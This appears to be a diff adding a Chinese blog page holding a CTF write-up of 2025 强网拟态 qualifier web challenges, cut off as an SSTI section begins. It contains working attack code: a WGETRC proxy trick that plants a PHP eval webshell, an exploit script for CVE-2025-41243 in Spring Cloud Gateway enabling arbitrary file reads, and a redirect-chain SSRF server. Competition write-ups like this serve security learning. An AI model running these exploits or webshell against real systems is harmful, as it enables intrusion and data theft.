@@ -1,0 +1,738 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1b1b26">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="smallcodeWGETRC 是 Wget 工具的配置文件，允许用户通过环境变量或文件自定义 Wget 的行为。因此通过指定WGETRC环境变量到1.txt文件进行相关配置； 通过在1.txt中写入代理，让wget通过代理请求hhhh，我们启动服务端监听端口作为代理端，只要是请求hhhh域名的地址返回指定内容。 在1.txt中在配置输出文件的名称为1.php，因此可以实现任意文件上传，写入一句话">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025强网拟态初赛web方向部分wp">
+<meta property="og:url" content="http://candyb0x.github.io/2025/10/29/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9Bweb%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86wp/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="smallcodeWGETRC 是 Wget 工具的配置文件，允许用户通过环境变量或文件自定义 Wget 的行为。因此通过指定WGETRC环境变量到1.txt文件进行相关配置； 通过在1.txt中写入代理，让wget通过代理请求hhhh，我们启动服务端监听端口作为代理端，只要是请求hhhh域名的地址返回指定内容。 在1.txt中在配置输出文件的名称为1.php，因此可以实现任意文件上传，写入一句话">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761366309896-ecf901a2-c993-4eef-a508-4e728dace4fb.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761366350104-cd82675b-c61b-457c-88c4-767bbc0298d2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761720561447-be4331e2-1047-477b-b44b-366a5fbb3dda.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761390891260-ed33983a-c0dc-44fb-b0c9-0023f46a34f9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761403712800-25dbe278-7823-4695-b6df-0f8f254b131e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761403739087-16eb7865-03e8-4474-8390-f8a8b2e37705.png">
+<meta property="article:published_time" content="2025-10-29T06:51:50.000Z">
+<meta property="article:modified_time" content="2025-12-24T13:47:16.893Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="强网拟态">
+<meta property="article:tag" content="2025">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761366309896-ecf901a2-c993-4eef-a508-4e728dace4fb.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>2025强网拟态初赛web方向部分wp - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2025强网拟态初赛web方向部分wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-29 14:51" pubdate>
+          2025年10月29日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2025强网拟态初赛web方向部分wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="smallcode"><a href="#smallcode" class="headerlink" title="smallcode"></a>smallcode</h1><p>WGETRC 是 Wget 工具的配置文件，允许用户通过环境变量或文件自定义 Wget 的行为。因此通过指定WGETRC环境变量到1.txt文件进行相关配置；</p>
+<p>通过在1.txt中写入代理，让wget通过代理请求hhhh，我们启动服务端监听端口作为代理端，只要是请求hhhh域名的地址返回指定内容。 在1.txt中在配置输出文件的名称为1.php，因此可以实现任意文件上传，写入一句话木马</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">input</span> = /tmp/<span class="hljs-number">1</span>.txt<br><span class="hljs-attr">post-file</span> = <span class="hljs-number">1</span>.txt<br><span class="hljs-attr">output_document</span> = <span class="hljs-number">1</span>.php<br><span class="hljs-attr">http_proxy</span>=http://**.**.**.**:<span class="hljs-number">28888</span>/<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p>服务端中的1.txt文件内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;candy&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> HTTPServer, BaseHTTPRequestHandler<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> os<br><br>logging.basicConfig(<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(message)s&#x27;</span><br>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyLikeHandler</span>(<span class="hljs-title class_ inherited__">BaseHTTPRequestHandler</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_GET</span>(<span class="hljs-params">self</span>):<br>        logging.info(<span class="hljs-string">f&quot;收到GET请求: <span class="hljs-subst">&#123;self.path&#125;</span>&quot;</span>)<br>        logging.info(<span class="hljs-string">f&quot;Host: <span class="hljs-subst">&#123;self.headers.get(<span class="hljs-string">&#x27;Host&#x27;</span>)&#125;</span>&quot;</span>)<br>        logging.info(<span class="hljs-string">f&quot;User-Agent: <span class="hljs-subst">&#123;self.headers.get(<span class="hljs-string">&#x27;User-Agent&#x27;</span>)&#125;</span>&quot;</span>)<br><br>        file_path = <span class="hljs-string">&#x27;1.txt&#x27;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(file_path):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                file_data = f.read()<br>            self.send_response(<span class="hljs-number">200</span>)<br>            self.send_header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/plain; charset=utf-8&#x27;</span>)<br>            self.send_header(<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>, <span class="hljs-string">&#x27;attachment; filename=&quot;1.txt&quot;&#x27;</span>)<br>            self.send_header(<span class="hljs-string">&#x27;Content-Length&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(file_data)))<br>            self.end_headers()<br>            self.wfile.write(file_data)<br>            logging.info(<span class="hljs-string">f&quot;已返回 1.txt (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(file_data)&#125;</span> 字节)&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.send_error(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;文件未找到: 1.txt&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_CONNECT</span>(<span class="hljs-params">self</span>):<br>        self.do_GET()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_POST</span>(<span class="hljs-params">self</span>):<br>        self.do_GET()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">log_message</span>(<span class="hljs-params">self, <span class="hljs-built_in">format</span>, *args</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_server</span>(<span class="hljs-params">host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">28888</span></span>):<br>    server_address = (host, port)<br>    httpd = HTTPServer(server_address, ProxyLikeHandler)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;HTTP服务器启动成功！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;监听地址: <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;所有通过此代理的请求都将收到 1.txt 文件&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">60</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;等待请求中...\n&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        httpd.serve_forever()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n服务器已停止&quot;</span>)<br>        httpd.server_close()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run_server()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761366309896-ecf901a2-c993-4eef-a508-4e728dace4fb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761366350104-cd82675b-c61b-457c-88c4-767bbc0298d2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>访问后即可将一句话木马写入，通过蚁剑连接后，使用nl读取flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761720561447-be4331e2-1047-477b-b44b-366a5fbb3dda.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="ezcloud"><a href="#ezcloud" class="headerlink" title="ezcloud"></a>ezcloud</h1><p>本题主要考察内容是 CVE-2025-41243 的任意文件读取，结合一下两个 poc 的内容，即可实现任意文件读取。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/">https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/</a></p>
+<p><a target="_blank" rel="noopener" href="https://rce.moe/2025/09/29/CVE-2025-41243">https://rce.moe/2025/09/29/CVE-2025-41243</a></p>
+<p>通过禁用安全限制，覆盖属性的替换路由，再由 setter 触发午餐静态方法刷新配置，实现对静态资源重写，然后即可使用<code>file:///</code>协议进行任意文件下载。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>s = requests.Session()<br>URL = <span class="hljs-string">&quot;http://web-a8bfd7363f.challenge.xctf.org.cn/&quot;</span><br><br>ROUTE_NAME = <span class="hljs-string">&quot;test_b&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_route</span>(<span class="hljs-params">predicate: <span class="hljs-built_in">str</span></span>):<br>    res = s.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/routes/<span class="hljs-subst">&#123;ROUTE_NAME&#125;</span>&quot;</span>,<br>        json=&#123;<br>            <span class="hljs-string">&quot;predicates&quot;</span>: [&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Path&quot;</span>, <span class="hljs-string">&quot;args&quot;</span>: &#123;<span class="hljs-string">&quot;_genkey_0&quot;</span>: <span class="hljs-string">&quot;/actuators/test&quot;</span>&#125;&#125;],<br>            <span class="hljs-string">&quot;filters&quot;</span>: [<br>                &#123;<br>                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;RewritePath&quot;</span>,<br>                    <span class="hljs-string">&quot;args&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;_genkey_0&quot;</span>: <span class="hljs-string">&quot;/test&quot;</span>,<br>                        <span class="hljs-string">&quot;_genkey_1&quot;</span>: predicate,<br>                    &#125;,<br>                &#125;<br>            ],<br>            <span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;http://example.com&quot;</span>,<br>            <span class="hljs-string">&quot;order&quot;</span>: -<span class="hljs-number">1</span>,<br>        &#125;,<br>    )<br>    res.raise_for_status()<br>    s.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/refresh&quot;</span>,<br>    )<br>    res.raise_for_status()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_route</span>():<br>    res = s.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/routes/<span class="hljs-subst">&#123;ROUTE_NAME&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> res.json()[<span class="hljs-string">&quot;filters&quot;</span>]<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;UNEXPECTED: <span class="hljs-subst">&#123;e!r&#125;</span>, <span class="hljs-subst">&#123;res.status_code&#125;</span> <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">raise</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_route</span>():<br>    res = s.delete(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/routes/<span class="hljs-subst">&#123;ROUTE_NAME&#125;</span>&quot;</span>)<br>    res.raise_for_status()<br>    s.post(<br>        <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>actuator/gateway/refresh&quot;</span>,<br>    )<br>    res.raise_for_status()<br><br><br>add_route(<span class="hljs-string">&quot;#&#123;@systemProperties[&#x27;spring.cloud.gateway.restrictive-property-accessor.enabled&#x27;] = false&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(read_route())<br><br>add_route(<span class="hljs-string">&quot;#&#123;@resourceHandlerMapping.urlMap[&#x27;/**&#x27;].locationValues[0]=&#x27;file:///&#x27;&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(read_route())<br><br>add_route(<span class="hljs-string">&quot;#&#123;@resourceHandlerMapping.urlMap[&#x27;/**&#x27;].afterPropertiesSet&#125;&quot;</span>)<br><span class="hljs-built_in">print</span>(read_route())<br></code></pre></td></tr></table></figure>
+
+<p>在修改路由配置以后，访问根目录下的 flag 内容即可获取 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://web-a8bfd7363f.challenge.xctf.org.cn/flag<br>下载flag<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1761390891260-ed33983a-c0dc-44fb-b0c9-0023f46a34f9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h1 id="safesecret"><a href="#safesecret" class="headerlink" title="safesecret"></a>safesecret</h1><p>由于 <code>walked_steps &gt;= ERROR_COUNT</code> 构造至少7步重定向链，因此通过起一个 python 服务实现 7 步重定向到<code>http://127.0.0.1:5000/_internal/secret</code>，获取得到 secret；</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step1&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step1</span>():<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, headers=&#123;<span class="hljs-string">&quot;Refresh&quot;</span>: <span class="hljs-string">&quot;0;url=http://**.**.**.**:8000/step2&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step2&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step2</span>():<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, headers=&#123;<span class="hljs-string">&quot;Refresh&quot;</span>: <span class="hljs-string">&quot;0;url=http://**.**.**.**:8000/step3&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step3&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step3</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://**.**.**.**:8000/step4&quot;&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step4&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step4</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://**.**.**.**:8000/step5&quot;&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step5&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step5</span>():<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, status=<span class="hljs-number">401</span>, headers=&#123;<span class="hljs-string">&quot;X-Next&quot;</span>: <span class="hljs-string">&quot;http://**.**.**.**:8000/step6&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step6&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step6</span>():<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, status=<span class="hljs-number">429</span>, headers=&#123;<span class="hljs-string">&quot;X-Next&quot;</span>: <span class="hljs-string">&quot;http://**.**.**.**:8000/step7&quot;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/step7&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step7</span>():<br>    <span class="hljs-comment"># 第7步后，重定向到目标</span><br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;&quot;</span>, headers=&#123;<span class="hljs-string">&quot;Refresh&quot;</span>: <span class="hljs-string">&quot;0;url=http://127.0.0.1:5000/_internal/secret&quot;</span>&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure>
+
+<p>虽然存在 ssti 注入，但是由于长度必须小于 47 个字符的限制，因此需要采用链式调用实现 ssti 注入。</p>
+<p>并且代码中注册了 sset 和 sget 两个函数到 Jinja2 的全局命名空间。</p>
